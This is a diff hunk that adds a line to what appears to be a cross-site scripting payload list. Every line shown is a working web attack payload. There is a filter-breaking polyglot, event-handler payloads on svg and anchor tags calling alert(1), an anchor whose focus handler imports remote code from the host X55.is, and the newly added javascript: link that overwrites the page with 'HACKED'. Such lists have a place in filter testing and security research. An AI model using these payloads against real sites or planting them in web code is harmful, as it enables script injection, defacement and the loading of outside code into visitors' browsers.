@@ -174,3 +174,4 @@ javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onm
 <svg oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>
 <a onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></a>
 <A href=//X55.is AutoFocus %26%2362 OnFocus%0C=import(href)>
+<a href="javascript:void(document.body.innerHTML='HACKED')">click</a>
